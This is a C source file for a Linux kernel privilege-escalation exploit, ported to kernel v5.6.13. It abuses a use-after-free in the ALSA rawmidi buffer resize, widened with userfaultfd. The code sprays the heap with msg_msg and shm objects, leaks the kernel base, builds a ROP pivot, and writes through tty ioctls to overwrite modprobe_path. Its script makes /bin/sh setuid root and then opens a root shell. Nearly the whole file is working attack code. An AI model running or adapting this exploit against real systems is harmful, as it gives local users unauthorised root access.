/*
    Port of exploit to v5.6.13 using a different write primitive
    Original exploit: https://1day.dev/notes/Linux-Kernel-n-day-exploit-development/

    The goal is to port it from v4.9.223 to v5.4 (or <5.7 where it got patched)
    since the write primitive got patched late v4.x
*/
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sound/asound.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/userfaultfd.h>
#include <inttypes.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <time.h>
#include <sys/uio.h>


#define TRUE (1 == 1)
#define FALSE (!TRUE)
#define errExit(msg)        \
    do {                    \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define DEV_RAWMIDI "/dev/snd/midiC0D1"
#define MODPROBE_PATH_OFFSET 0x69be0
#define KBASE_OFFSET 0x16af700
#define ADDRESS_PAGE_FAULT_1 0x5550000
#define ADDRESS_PAGE_FAULT_2 0x7770000
#define ADDRESS_PAGE_FAULT_3 0x9990000

#define PAGE_SIZE 0x1000
#define MSG_COPY 040000
#define MSGHEADER_SIZE 0x30
#define SHELL 					 "/bin/sh"
#define TTY_SPRAY 100

struct thread_args {
    int id;
    int uffd;
    void* addr_to_trigger;
    char* content;
    int size;
};

struct thread_snd_write_args {
    void* addr;
    size_t size;
};


// struct msgbuf {
//     unsigned long mtype;
//     char mtext[1];
// };

char *root_argv[] = {"-p", NULL};
char *modprobe_win = "/tmp/ezz\x00";
char *dummy_file = "/tmp/d\x00";

/* msg_msg */
#define Cyan(string) "\e[0;36m" string "\x1b[0m"
#define BCyan(string) "\e[1;36m" string "\x1b[0m"
#define MSGTYPE 0x537
#define MSGKEY 0x1337

long uffd; /* userfaultfd file descriptor */
pthread_t tids[8];
int release_page_fault = TRUE;
int fd_rawmidi;

static void*
fault_handler_thread(struct thread_args* arg)
{
    static char* page = NULL;
    static struct uffd_msg msg; /* Data read from userfaultfd */

    struct uffdio_copy uffdio_copy;

    long uffd; /* userfaultfd file descriptor */
    ssize_t nread;
    void* addr_to_trigger;
    char* input_content;
    int input_size;

    uffd = arg->uffd;
    addr_to_trigger = arg->addr_to_trigger;
    input_content = arg->content;
    input_size = arg->size;

    /* Create a page that will be copied into the faulting region. */
    if (page == NULL) {
        page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            errExit("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor. */
    for (;;) {
        /* See what poll() tells us about the userfaultfd. */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        // printf("\nfault_handler_thread():\n");
        // printf("    poll() returns: nready = %d; "
        //        "POLLIN = %d; POLLERR = %d\n",
        //     nready,
        //     (pollfd.revents & POLLIN) != 0,
        //     (pollfd.revents & POLLERR) != 0);

        /* Read an event from the userfaultfd. */
        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!");
        if (nread == -1)
            errExit("read");
        /* We expect only one kind of event; verify that assumption. */
        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd");
        else if (msg.event == UFFD_EVENT_PAGEFAULT) {
            /* Display info about the page-fault event. */
            printf("[+] Page Fault triggered for %p!\n", msg.arg.pagefault.address);
            if (msg.arg.pagefault.address == (void*)addr_to_trigger) {
                printf("[*] satisfied msg.arg.pagefault.address == (void*) addr_to_trigger (%p)\n", addr_to_trigger);
                while (release_page_fault == TRUE)
                    ;
            }
            else {
                // Not our desired page fault
                printf("[-] NOT OUR CASE\n");
                continue;
            }

            // printf("[+] PAGE FAULT RELEASED");
            // printf("    UFFD_EVENT_PAGEFAULT event: ");
            // printf("flags = %" PRIx64 "; ", msg.arg.pagefault.flags);
            // printf("address = 0x%" PRIx64 "\n", msg.arg.pagefault.address);

            // Write into the new page desired input with desired input size
            memcpy(page, input_content, input_size);

            uffdio_copy.src = (unsigned long)page;
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary. */

            uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
            uffdio_copy.len = PAGE_SIZE;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");

            // printf("        (uffdio_copy.copy returned %" PRId64 ")\n",
            // uffdio_copy.copy);
            release_page_fault = TRUE;
            break;
        }
    }
    close(uffd);
    printf("[*] Page fault thread terminated\n");
}

void l_print_qword(void* address)
{
    unsigned long first;
    unsigned long second;
    first = *(int64_t*)address;
    second = *(int64_t*)(address + 0x8);
    printf(BCyan("%p:\t"), address);
    printf(Cyan("0x%016lx 0x%016lx\n"), first, second);
}

void dump_memory(void* start_address, size_t size)
{
    void* end_address = start_address + size; // also if not padded to 8 it will be fine in the loop condition
    printf("\n");
    while (start_address < end_address) {
        l_print_qword(start_address);
        start_address = start_address + (8 * 2);
    }
}

void* thread_sound_write(struct thread_snd_write_args* arg)
{
    void* addr;
    size_t size;
    ssize_t write_n;
    int fd_test;
    addr = arg->addr;
    size = arg->size;
    printf("[*] snd_write thread with addr:%p and size: %ld ..\n", addr, size);
    write_n = write(fd_rawmidi, addr, size);
    printf("bytes written: %zu\n", write_n);
}

int sound_resize_params(int stream, size_t buffer_size, size_t avail_min)
{
    struct snd_rawmidi_params params = { 0 };
    params.stream = stream;
    params.buffer_size = buffer_size;
    params.avail_min = avail_min;
    int ioctl_res = ioctl(fd_rawmidi, SNDRV_RAWMIDI_IOCTL_PARAMS, &params);
    if (ioctl_res == -1)
        errExit("ioctl SNDRV_RAWMIDI_IOCTL_PARAMS");
    return 0;
}

int get_msg(int qid, void* out_buf, int msg_len, int msg_type)
{
    int r = msgrcv(qid, out_buf, msg_len, msg_type, IPC_NOWAIT | MSG_NOERROR);
    if (r == -1) {
        if (errno != ENOMSG) {
            perror("msgrcv");
            return -1;
        }
        printf("[get_msg] No message received\n");
        return 0;
    }
    printf("[*] Received %d bytes \n", r);
    return 1;
}

int send_msg(int qid, void* memory, int msg_len, int msg_type)
{
    struct msgbuf* msg_buf;
    msg_buf = malloc(sizeof(struct msgbuf) + msg_len);
    msg_buf->mtype = msg_type;
    memcpy(msg_buf->mtext, memory, msg_len);
    if (msgsnd(qid, msg_buf, (sizeof(msg_buf) + msg_len), IPC_NOWAIT) == -1) {
        errExit("msgsnd");
    }
    return 0;
}

void init_userfault_thread(int th_num, void* addr_to_monitor, int range, char* input_content, int input_size)
{
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");
    uffdio_register.range.start = (unsigned long)addr_to_monitor;
    uffdio_register.range.len = range; // IMPORTANT: The range
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    printf("[+] userfaultfd registered\n");
    struct thread_args* args = (struct thread_args*)malloc(sizeof(struct thread_args));
    args->id = 1337;
    args->uffd = uffd;
    args->addr_to_trigger = addr_to_monitor;
    args->content = input_content;
    args->size = input_size;
    s = pthread_create(&tids[th_num], NULL, fault_handler_thread, (void*)args);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }
}

void spray_shm(int num)
{
    int shmid[0x100] = { 0 };
    void* shmaddr[0x100] = { 0 };
    for (int i = 0; i < num; i++) {
        shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);
        if (shmid[i] < 0)
            errExit("shmget");
        shmaddr[i] = (void*)shmat(shmid[i], NULL, SHM_RDONLY);
        if (shmaddr[i] < 0)
            errExit("shmat");
    }
}

void heap_groom(int size, int n, int type)
{
    struct {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = type;
    int mqids[n];
    memset(msg.mtext, 0x21, sizeof(msg.mtext));
    for (int i = 0; i < n; i++) {
        mqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (msgsnd(mqids[i], &msg, sizeof(msg.mtext), 0) != 0)
            printf("[*] Error with msgsnd %d in heap_groom\n", mqids[i]);
    }
    for (int i = 0; i < n; i++) {
        if (msgrcv(mqids[i], &msg.mtext, sizeof(msg.mtext), type, 0) == -1)
            printf("[*] Error with msgrcv %d in heap_groom\n", mqids[i]);
    }
}

void modprobe_init()
{
    int fd = open(dummy_file, O_RDWR | O_CREAT);
    if (fd < 0) {
        perror("[*] dummy_file creation failed");
        exit(-1);
    }

    char bad_magic[] = "\xff\xff\xff\xff";
    write(fd, bad_magic, sizeof(bad_magic));
    close(fd);

    char w[] = "#!/bin/sh\nchmod 4755 " SHELL "\n && chown root:root " SHELL "\n && chmod u+s " SHELL "\n";

    if (chmod(dummy_file, 0777) < 0) {
        puts("[!] Failed to chmod dummy_file");
        exit(-1);
    };

    fd = open(modprobe_win, O_RDWR | O_CREAT);
    if (fd < 0) {
        perror("[*] modprobe_win creation failed");
        exit(-1);
    }

    write(fd, w, sizeof(w));
    close(fd);

    if (chmod(modprobe_win, 0777) < 0) {
        puts("[!] Failed to chmod modprobe_win");
        exit(-1);
    };

    return;
}

void trigger_modprobe()
{
    puts("[*] Triggering modprobe via dummy file");
    execve(dummy_file, NULL, NULL);
    return;
}

int main(void)
{

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(1, sizeof(cpu_set_t), &set);

    cpu_set_t set2;
    CPU_ZERO(&set2);
    CPU_SET(1, &set2);
    sched_setaffinity(1, sizeof(cpu_set_t), &set2);

    printf("[*] Starting exploit ..\n");

    void* addr = (void*)ADDRESS_PAGE_FAULT_1;
    if (mmap(addr, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED)
        errExit("mmap");
    // setup_modprobe_hax();

    modprobe_init();

    // Content that will be overwritten from the page fault handler
    char content_first_userfault[PAGE_SIZE];
    memset(content_first_userfault, 0xff, PAGE_SIZE);

    // Init and start the user page fault thread
    // In this case the size is not important since we will block the write from the rawmidi write
    int init_tid = 1;
    init_userfault_thread(init_tid, addr + PAGE_SIZE, PAGE_SIZE, content_first_userfault, 0xff);

    fd_rawmidi = open(DEV_RAWMIDI, O_RDWR);
    if (fd_rawmidi < 0)
        errExit("fd");

    /* START */
    heap_groom(4096, 4, 24);
    int qid[10];
    srand(time(0));
    int msgkey = rand();
    int msgkey2 = rand();

    qid[0] = msgget(msgkey, IPC_CREAT | 0666);
    if (qid[0] == -1)
        errExit("msgget");

    /* Allocate and re-size the buffer in order to have an arbitrary sized chunk */
    // It's not important how much we write, kmalloc(PAGE_SIZE) will always be the first allocation
    char write_buffer[10] = { 0 };
    memset(&write_buffer, 0x41, 10);
    printf("[*] First write to init substream..\n");
    write(fd_rawmidi, &write_buffer, 4);

    // re-size in order to have an arbitrary sized chunk freed that lands in kmalloc-4096
    // this step can be skipped since our chunk is already in kmalloc-4096, but for future uses I keep it (if it's necessary to change the cache)
    printf("[*] Resizing buffer_size to 4096 ..\n");

    // sound_resize_params(int stream, size_t buffer_size, size_t avail_min)
    sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 4090, 7);

    // Trigger the PAGE FAULT only at 0x5550000 + PAGE_SIZE
    // Since we want to overwrite msg_msg->ms_ts (at 0x18) (and we do not want to overwrite everything before)
    memset(addr, 0x43, PAGE_SIZE);
    struct thread_snd_write_args snd_write_arg;
    snd_write_arg.addr = addr + PAGE_SIZE - 0x18;
    snd_write_arg.size = 0x18 + 0x2; // 0x2 is the 0xffff that will be written in msg_msg->ms_ts

    // Trigger the page fault and lock in copy_from_user
    pthread_create(&tids[2], NULL, thread_sound_write, &snd_write_arg);
    printf("[*] snd_write triggered (should fault) \n");

    void* mem = malloc(4096 * 2);
    memset(mem, 0x45, 4096 * 2);

    // We have to trigger the buffer re-size in order to free the object
    // sound_resize_params(int stream, size_t buffer_size, size_t avail_min)
    printf("[*] Freeing buf using SNDRV_RAWMIDI_IOCTL_PARAMS\n");
    sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 90, 7);

    printf("[*] Replacing freed obj with msg_msg .\n");
    send_msg(qid[0], mem, (PAGE_SIZE - MSGHEADER_SIZE) + 10, 1);

    memset(mem, 0x46, 1024);

    spray_shm(100);

    release_page_fault = FALSE;

    printf("[*] Waiting for userfaultd to finish ..\n");
    while (release_page_fault == FALSE)
        ; // Waits that the page fault handler ends

    printf("[+] Page fault lock released\n");
    unsigned long* res = malloc(PAGE_SIZE * 2);
    memset(res, 0x0, PAGE_SIZE * 2);

    get_msg(qid[0], res, PAGE_SIZE * 2, 1);
    // dump_memory(res, PAGE_SIZE * 2);

    unsigned long init_ipc_ns = *(res + (0xff8 / sizeof(unsigned long)));
    unsigned long modprobe_path = init_ipc_ns - MODPROBE_PATH_OFFSET;
    unsigned long kbase = init_ipc_ns - KBASE_OFFSET;
    // unsigned long kbase = 0xffffffff81000000;
    printf("[+] init_ipc_ns @0x%lx\n", init_ipc_ns);
    printf("[+] calculated kbase @0x%lx\n", kbase);
    // printf("[+] calculated modprobe_path @0x%lx\n", modprobe_path);

    release_page_fault = TRUE;
    close(fd_rawmidi);
    fd_rawmidi = 0;
    // check if kbase is a valid kernel base address
    if (kbase < 0xffffffff80000000 || kbase > 0xffffffffc0000000) {
        printf("[-] Invalid kbase, aborting\n");
        exit(0);
    } else {
        /*
            Heap leak
        */
        heap_groom(1024, 8, 48);
        printf("[*] Attempting heap leak\n");
        fd_rawmidi = open(DEV_RAWMIDI, O_RDWR);
        if (fd_rawmidi < 0) {
            errExit("fd_rawmidi");
        }
        if (mmap(ADDRESS_PAGE_FAULT_2, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) {
            errExit("heap leak mmap");
        }

        char content_first_userfault2[PAGE_SIZE];
        memset(content_first_userfault2, 0xff, PAGE_SIZE);

        init_userfault_thread(3, ADDRESS_PAGE_FAULT_2 + PAGE_SIZE, PAGE_SIZE, content_first_userfault2, 0xff);

        int res_w = write(fd_rawmidi, &write_buffer, 4);

        printf("[*] Resizing buffer_size to land into kmalloc-1024 ..\n");
        // sound_resize_params(int stream, size_t buffer_size, size_t avail_min)
        sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 1028, 2);

        // Trigger page fault
        struct thread_snd_write_args write_args;
        write_args.addr = ADDRESS_PAGE_FAULT_2 + PAGE_SIZE - 0x18; // targeting the info->cleanup(info) call
        write_args.size = 0x18 + 0x2; // 0x2 is the 0xffff that will be written in msg_msg->ms_ts

        pthread_create(&tids[4], NULL, thread_sound_write, &write_args);
        printf("[*] snd_write triggered (should fault) \n");

        printf("[*] Freeing buf using SNDRV_RAWMIDI_IOCTL_PARAMS\n");
        sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 300, 7);

        qid[1] = msgget(msgkey2, IPC_CREAT | 0666);

        unsigned long pivot_gadget = kbase + 0xe4095;
        unsigned long ret = kbase + 0x1e;

        // rop gadget
        for (int i = 0x100; i < PAGE_SIZE; i += 8) {
            memcpy(mem + i, &ret, 8);
        }

        for (int i = 0; i < 0x100; i += 8) {
            memcpy(mem + i, &pivot_gadget, 8);
        }

        for (int i = 0; i < 16; i++) {
            send_msg(qid[1], mem, (1024 - MSGHEADER_SIZE), 2);
        }

        release_page_fault = FALSE;

        printf("[*] Waiting for userfaultd to finish ..\n");
        while (release_page_fault == FALSE)
            ;

        printf("[+] Page fault lock released\n");

        unsigned long* res2 = malloc(PAGE_SIZE * 2);
        memset(res2, 0x0, PAGE_SIZE * 2);

        get_msg(qid[1], res2, PAGE_SIZE * 2, 2);
        // dump_memory(res2, PAGE_SIZE * 2);

        unsigned long heap_leak = *(res2 + (0x7d8 / sizeof(unsigned long)));
        printf("[*] msg *next leak: 0x%lx\n", heap_leak);

        unsigned long evil = heap_leak + 0x30;

        /* ARBITRARY WRITE */
        if (evil != 0x30) {
            printf("[*] Starting arbitrary write\n");

            fd_rawmidi = open(DEV_RAWMIDI, O_RDWR);
            if (fd_rawmidi < 0) {
                errExit("fd_rawmidi");
            }

            if (mmap(ADDRESS_PAGE_FAULT_3, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) {
                errExit("AAW 1st mmap");
            }
            char content_first_userfault3[PAGE_SIZE];
            memset(content_first_userfault3, 0xf9, PAGE_SIZE);

            unsigned long temp = evil;

            for (int i = 0; i < PAGE_SIZE; i += 8) {
                memcpy(content_first_userfault3 + i, &temp, 8);
            }

            // set up userfaultfd thread handler
            init_userfault_thread(5, ADDRESS_PAGE_FAULT_3 + PAGE_SIZE, PAGE_SIZE, content_first_userfault3, 0xff);

            // reusing the prev write_buffer
            int res_w2 = write(fd_rawmidi, &write_buffer, 4);

            printf("[*] Resizing buffer_size to land into kmalloc-1024 ..\n");
            // sound_resize_params(int stream, size_t buffer_size, size_t avail_min)
            sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 1018, 2);

            // Trigger page fault
            struct thread_snd_write_args write_args2;
            write_args2.addr = (ADDRESS_PAGE_FAULT_3 + PAGE_SIZE) - 0x18; // targeting the tty_struct->f_ops
            write_args2.size = 32;

            pthread_create(&tids[6], NULL, thread_sound_write, &write_args2);
            printf("[*] snd_write triggered (should fault) \n");

            sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 300, 1);

            release_page_fault = FALSE; // Tells the fault_handler thread to start its job
            printf("[*] Waiting for userfaultd to finish ..\n");
            while (release_page_fault == FALSE)
                ; // Waits that the page fault handler ends

            int fds[TTY_SPRAY];
            for (int i = 0; i < TTY_SPRAY; i++) {
                fds[i] = open("/dev/ptmx", O_RDWR);
                if (fds[i] < 0) {
                    perror("tty_struct open");
                }
            }
            char cmd[] = "/tmp/ezz";
            for ( int i = 0 ; i < sizeof(cmd) ; i += 4) {
                for (int j = 0; j < TTY_SPRAY; j++) {
                    ioctl(fds[j], *(unsigned int*)&cmd[i], modprobe_path + i);
                }
            }

            trigger_modprobe();
            struct stat check;
            if (stat(SHELL, &check) < 0) {
                perror("[-] Error on checking /bin/dash permissions");
                exit(-1);
            }
            if (check.st_mode & S_ISUID) {
                printf("[*] We are root\n");
                execve(SHELL, root_argv, NULL);
            }

            for (int i = 0; i < TTY_SPRAY; i++) {
                if (close(fds[i])) {
                    perror("tty_struct close");
                }
            }

        } else {
            printf("[*] No heap leak, exiting early :') \n");
            exit(-1);
        }
    }
}